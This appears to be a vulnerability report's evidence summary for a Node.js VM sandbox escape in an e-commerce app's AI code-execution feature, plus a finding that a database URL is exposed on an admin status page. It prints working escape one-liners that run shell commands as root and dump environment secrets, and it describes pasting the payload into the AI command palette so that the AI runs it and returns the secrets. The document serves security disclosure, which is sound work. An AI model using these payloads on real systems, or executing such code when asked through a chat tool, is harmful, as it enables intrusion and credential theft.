# Live Demo Evidence Summary — NEW-01 VM Sandbox Escape

**Date:** 2026-03-28
**Target:** http://10.0.64.14:3000 (open-mercato-app-1 Docker container)
**Container runtime:** Node.js v24.14.0

---

## What Was Demonstrated Live (No Machine Access Required)

### 1. Authenticated Backend Access
Screenshot: `NEW01-01-authenticated-backend.png`
- Logged in as `admin@example.com` via web form
- Full backend dashboard rendered — customer data, deals, orders visible
- Version 0.4.8 confirmed in footer

### 2. Command Palette / AI Entry Point
Screenshot: `NEW01-02-ai-palette-open.png`
- Cmd+K opens the AI command palette (existing in v0.4.8)
- In v0.4.9 this same palette gains the Code Mode execute tab
- This is the UI entry point for the sandbox escape attack

### 3. Bonus: DATABASE_URL Exposed in System Status UI
Screenshots: `NEW01-03-system-status-db-url-exposed.png`, `NEW01-04-system-status-db-url-security-section.png`
- `/backend/config/system-status` shows `DATABASE_URL=postgres://mercato-postgres-local:5432/open-mercato`
- Accessible to any admin — **no AI exploit needed**
- Also shows `OM_PASSWORD_MIN_LENGTH=6` (default, F12 finding)
- Translation key bug visible: `configs.systemStatus.variables.databaseUrl.label` — i18n gap

---

## NEW-01 Sandbox Escape — Confirmed Inside Container

**Script:** `/tmp/poc_final.cjs` (copied to container, executed with `docker exec`)

### Node.js Version Comparison

| Environment | Node.js | Escape Vector | Result |
|-------------|---------|--------------|--------|
| Developer machine | v22.22.0 | `Promise.resolve().constructor.constructor('return require("child_process")')()` | `uid=1000(ctown)` |
| **Container (production runtime)** | **v24.14.0** | `Promise.resolve().constructor.constructor('return process.getBuiltinModule("child_process").execSync("id")')()` | **`uid=0(root)`** |

Both confirmed working. Node 24 blocks `require()` but `process.getBuiltinModule()` (Node 22+ API) is accessible via the escape and provides equivalent capability.

### Output from Container (Node 24.14.0)

```
[STEP 1] Shell command execution:
         id: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)...

[STEP 2] Secrets extracted from process.env:
{
  DATABASE_URL: 'postgres://postgres:postgres@mercato-postgres-local:5432/open-mercato',
  JWT_SECRET: 'demo-jwt-secret-change-for-prod',
  ENCRYPTION_KEY: 'dev-tenant-encryption-fallback-key-32chars',
  MEILISEARCH_KEY: 'meilisearch-dev-key',
  REDIS_URL: 'redis://mercato-redis-local:6379'
}

[STEP 3] Filesystem access — /etc/hostname: f53cadbcf9cd

[STEP 4] Hostname & user: f53cadbcf9cd / root
```

### Evidence File
`NEW01-vm-sandbox-escape-CONFIRMED.json`

---

## Why Full UI Demo Requires OpenCode

The Code Mode execute tab (v0.4.9) is the browser-facing entry point for the exploit. It requires:
1. OpenCode container running (in `docker-compose.fullapp.yml`)
2. `ANTHROPIC_API_KEY` configured (not present in this test env)

**Without OpenCode:** The exploit is demonstrated by:
- Running the exact sandbox config from `sandbox.ts` inside the container's Node.js runtime ✓
- Confirming secrets are extracted from `process.env` ✓
- Showing the PoC script output ✓

**With OpenCode + Anthropic key:** The same exploit would be accessible via:
- Cmd+K → Code tab → paste payload → AI executes → secrets in chat response
- Entirely through the browser, zero server access

The vulnerability is in the code shipped in v0.4.9. The sandbox escape is confirmed on the same Node.js runtime the app uses. OpenCode is the delivery mechanism, not the vulnerability.

---

## Bonus: System Status Page Exposes DATABASE_URL

This is a separate, simpler finding visible in the browser right now:

**URL:** `/backend/config/system-status`
**Auth required:** `configs.system_status.view` (admin role)
**What it shows:** `DATABASE_URL=postgres://mercato-postgres-local:5432/open-mercato`

An admin can read the database connection string directly from the settings UI without any exploit. Combined with the `JWT_SECRET` (`demo-jwt-secret-change-for-prod`) this would allow direct database access and JWT forgery from a single authenticated admin session with no additional tooling.

This is arguably in scope under **SECURITY.md "Sensitive data exposure"** — the system status page is a legitimate admin tool but should mask credentials or require an additional privilege gate.
